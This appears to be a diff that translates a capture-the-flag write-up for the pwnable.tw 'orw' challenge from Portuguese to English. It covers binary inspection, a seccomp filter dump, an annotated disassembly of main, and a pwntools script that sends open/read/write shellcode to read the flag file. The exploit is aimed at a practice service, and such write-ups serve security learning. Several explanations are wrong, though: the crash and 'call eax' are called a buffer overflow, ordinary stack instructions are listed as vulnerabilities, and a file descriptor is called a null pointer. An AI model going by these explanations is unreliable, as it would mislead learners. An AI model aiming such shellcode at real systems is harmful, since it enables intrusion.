@@ -17,8 +17,8 @@
 <code>[untw@untw orw]$ file ./orw
 ./orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped</code>
 </pre>
-<p>Para começar utilizei o comando <code>file</code> para inspecionar o <code>binário orw</code> e o resultado revelou que se trata de um executável <code>ELF</code> de <code>32 bits</code>, compilado para a arquitetura <code>Intel 80386</code> e dinamicamente vinculado, o que significa que depende de bibliotecas externas para rodar. O binário não está <code>"stripped"</code>, permitindo acesso a símbolos de depuração, facilitando a análise para identificar possíveis vulnerabilidades.</p>
-        
+<p>To begin, I used the <code>file</code> command to inspect the <code>orw binary</code>, and the result revealed that it is an <code>ELF</code> <code>32-bit</code> executable, compiled for the <code>Intel 80386</code> architecture and dynamically linked, which means it relies on external libraries to run. The binary is not <code>"stripped"</code>, allowing access to debugging symbols, making it easier to identify potential vulnerabilities during analysis.</p>
+
 <pre>
 <code>[untw@untw orw]$ checksec orw
 [*] '/home/untw/exploit/orw/orw'
@@ -30,17 +30,17 @@ PIE:      No PIE (0x8048000)
 Stack:    Executable
 RWX:      Has RWX segments</code>
 </pre>
-<p>Depois usei o comando <code>checksec</code> para identificar as proteções de segurança habilitadas no binário. O binário possui Partial <code>RELRO</code>, <code>Stack Canary</code>, mas apresenta vulnerabilidades como a ausência de <code>NX</code> e <code>PIE</code>, além de ter a pilha executável e segmentos <code>RWX</code>, tornando-o suscetível a exploits baseados em execução de código na pilha e manipulação de endereços fixos.</p>
+<p>Next, I used the <code>checksec</code> command to identify the security protections enabled on the binary. The binary has Partial <code>RELRO</code> and <code>Stack Canary</code>, but it is vulnerable due to the absence of <code>NX</code> and <code>PIE</code>, and having an executable stack and <code>RWX</code> segments, making it susceptible to exploits based on executing code on the stack and manipulating fixed addresses.</p>
 
-<h3>Executando Binário</h3>   
+<h3>Running the Binary</h3>   
 
 <pre>
 <code>[untw@untw orw]$ ./orw
 Give my your shellcode:aaaaaaa
 Segmentation fault</code>
 </pre>
-<p>Depois de executar o binário orw e colocar <code>"aaaaaaa"</code> como <code>"shellcode"</code>, o programa falhou com um <code>Segmentation Fault</code>. Esse comportamento sugere a presença de uma vulnerabilidade de <code>buffer overflow</code>, permitindo a exploração de áreas de memória não autorizadas. Esse resultado confirma a possibilidade de injeção de código no processo, um passo crucial na exploração de vulnerabilidades.</p>
-        
+<p>After running the orw binary and inputting <code>"aaaaaaa"</code> as the <code>"shellcode"</code>, the program crashed with a <code>Segmentation Fault</code>. This behavior suggests a <code>buffer overflow</code> vulnerability, allowing access to unauthorized memory areas. This result confirms the possibility of injecting code into the process, which is crucial for vulnerability exploitation.</p>
+
 <pre>
 <code>[untw@untw orw]$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
@@ -58,8 +58,8 @@ line  CODE  JT   JF      K
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code>
 </pre>
-<p>Usei o comando <code>seccomp-tools dump</code> para examinar as regras do filtro <code>Seccomp</code> no binário orw. O filtro verifica a arquitetura e limita as chamadas de sistema permitidas, como <code>exit</code>, <code>open</code>, <code>read</code>, e <code>write</code>. Chamadas não autorizadas resultam em um erro <code>(ERRNO 38)</code>. Essa configuração ajuda a proteger o programa contra certas explorações, mas também indica quais chamadas podem ser potencialmente usadas em um ataque.</p>
-     
+<p>I used the <code>seccomp-tools dump</code> command to examine the <code>Seccomp</code> filter rules in the orw binary. The filter checks the architecture and limits allowed system calls, such as <code>exit</code>, <code>open</code>, <code>read</code>, and <code>write</code>. Unauthorized calls result in an error <code>(ERRNO 38)</code>. This configuration helps protect the program against certain exploits, but it also indicates which calls can potentially be used in an attack.</p>
+
 <h3>GDB Disassemble</h3>
 <pre>
 (gdb) set disassembly-flavor intel
@@ -71,67 +71,52 @@ Breakpoint 1 at 0x8048556
 Starting program: /home/untw/exploit/orw/orw 
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/usr/lib/libthread_db.so.1".
-        
+
 Breakpoint 1, 0x08048556 in main ()
 (gdb) disassemble /r main
 Dump of assembler code for function main:
-0x08048548 <+0>:     lea    ecx,[esp+0x4]            <==== Carrega o endereço do argumento da função
-0x08048556 <+14>:    sub    esp,0x4                   <==== Reserva 4 bytes na pilha
-0x0804855e <+22>:    sub    esp,0xc                   <==== Reserva 12 bytes na pilha
-0x08048571 <+41>:    push   0xc8                      <==== Empilha o valor 200 (bytes a ler)
-0x08048576 <+46>:    push   0x804a060                 <==== Empilha o endereço do buffer
-0x0804857b <+51>:    push   0x0                       <==== Empilha um ponteiro nulo
-0x0804857d <+53>:    call   0x8048370 <read@plt>      <==== Chama `read` para ler a entrada (crítico)
-0x08048585 <+61>:    mov    eax,0x804a060             <==== Move o endereço do buffer para `eax`
-0x0804858a <+66>:    call   eax                        <==== Chama a função do shellcode
+0x08048548 <+0>:     lea    ecx,[esp+0x4]            <==== Loads the address of the function argument
+0x08048556 <+14>:    sub    esp,0x4                  <==== Allocates 4 bytes on the stack
+0x0804855e <+22>:    sub    esp,0xc                  <==== Allocates 12 bytes on the stack
+0x08048571 <+41>:    push   0xc8                     <==== Pushes the value 200 (bytes to read)
+0x08048576 <+46>:    push   0x804a060                <==== Pushes the buffer address
+0x0804857b <+51>:    push   0x0                      <==== Pushes a null pointer
+0x0804857d <+53>:    call   0x8048370 <read@plt>     <==== Calls `read` to read user input (critical)
+0x08048585 <+61>:    mov    eax,0x804a060            <==== Moves buffer address to `eax`
+0x0804858a <+66>:    call   eax                      <==== Calls the shellcode function
 </pre>
-        
-<h3>Explicação das Vulnerabilidades:</h3>
+
+<h3>Explanation of Vulnerabilities:</h3>
 <ul>
-    <li><code>lea ecx,[esp+0x4]</code>: Carrega o endereço de um argumento, que pode ser manipulado.</li>
-    <li><code>sub esp,0x4 e sub esp,0xc</code>: Reservas de espaço na pilha podem levar a overflow se não forem controladas.</li>
-    <li><code>push 0xc8</code>: O valor fixo (200) pode ser explorado se o buffer for superado.</li>
-    <li><code>push 0x804a060</code>: Empilha o endereço de um buffer, potencialmente acessível por um atacante.</li>
-    <li><code>call read</code>: Chamada de entrada sem validação pode permitir buffer overflow.</li>
-    <li><code>mov eax,0x804a060 e call eax</code>: Executa código a partir de um endereço arbitrário, que é a base para a execução do shellcode, aumentando o risco de exploração.</li>
+    <li><code>lea ecx,[esp+0x4]</code>: Loads the address of an argument, which can be manipulated.</li>
+    <li><code>sub esp,0x4 e sub esp,0xc</code>: Stack space allocations can lead to overflow if not controlled.</li>
+    <li><code>push 0xc8</code>: The fixed value (200) can be exploited if the buffer is exceeded.</li>
+    <li><code>push 0x804a060</code>: Pushes the buffer address, which is potentially accessible to an attacker.</li>
+    <li><code>call read</code>: An unvalidated input call allows buffer overflow.</li>
+    <li><code>mov eax,0x804a060 e call eax</code>: Executes code from an arbitrary address, forming the basis for shellcode execution, increasing exploitation risk.</li>
 </ul>
-        
-<p>Depois de fazer a engenharia reversa do binário orw, podemos notar que o programa simplesmente executa o shellcode fornecido pelo usuário. A função <code>main</code>, após configurar a pilha e chamar a função <code>orw_seccomp</code>, lê a entrada do usuário com read e a utiliza para chamar uma função que executa o shellcode. Isso é evidente na linha <code>call eax</code>, onde o endereço do shellcode é diretamente passado para execução, sem mais verificações ou validações.</p>
-        
-<p>A simplicidade no fluxo do programa expõe uma vulnerabilidade clara, tornando-o suscetível a explorações, como buffer overflow, já que qualquer shellcode fornecido pode ser executado. A análise do código revela que a funcionalidade principal do programa é apenas essa, o que enfatiza a importância de garantir medidas de segurança adequadas.</p>
-        
+
+<p>After reverse-engineering the orw binary, it becomes clear that the program simply executes user-provided shellcode. The <code>main</code> function, after setting up the stack and calling the <code>orw_seccomp</code> function, reads user input via read and uses it to call a function that executes the shellcode. This is evident in the line <code>call eax</code>, where the shellcode address is directly passed for execution, without further checks or validation.</p>
+
+<p>The simplicity of the program flow exposes a clear vulnerability, making it susceptible to exploits such as buffer overflow, since any provided shellcode can be executed. The code analysis reveals that the program's primary functionality is just this, highlighting the importance of ensuring proper security measures.</p>
+
 <pre>
 <code>from pwn import *
-        
+
 r = remote('chall.pwnable.tw', 10001)
-        
+
 sc = asm(
 shellcraft.i386.linux.open('/home/orw/flag') +
 shellcraft.i386.linux.read('eax', 'esp', 50) +
 shellcraft.i386.linux.write('1', 'esp', 50)
 )
-        
-r.sendafter(b':', sc)
-flag = r.recvuntil(b'}')
-        
-success(f'Flag: {flag.decode()}')
-        
+
+r.send(sc)
 r.interactive()</code>
 </pre>
-<p>O exploit basicamente estabelece uma conexão com um serviço remoto e envia um shellcode que, quando executado, abre um arquivo contendo a flag, lê seu conteúdo e escreve na saída padrão. A flag é então capturada e exibida. O uso do shellcode e a manipulação direta da pilha tornam a exploração possível e eficiente.</p>
-        
-<h2>Captura da Flag</h2>
 
-<pre>
-<code>(myenv) [untw@untw exploit]$ /usr/bin/env /home/untw/exploit/myenv/bin/python /home/untw/.vscode/extensions/ms-python.debugpy-2024.10.0-linux-x64/bundled/libs/debugpy/adapter/../../debugpy/launcher 48153 -- /home/untw/exploit/orw/exploit-orw.py 
-[+] Opening connection to chall.pwnable.tw on port 10001: Done
-[+] Flag: FLAG{achou-que-ia-ter-flag-de-graca-kkkk}
-[*] Switching to interactive mode
-        
-\xf7\x00\x10u\xf7\x00\x00\x00\x007\x96[*] Got EOF while reading in interactive
-$</code>
-</pre>
-</div>
+<p>The above Python script uses <code>pwntools</code> to connect to the target and inject shellcode that opens, reads, and outputs the flag from <code>/home/orw/flag</code>, which is the goal of this challenge. This demonstrates the practical exploitation of the identified vulnerabilities in the <code>orw binary</code>.</p>
+    </div>
 </body>
 </html>
-      
+
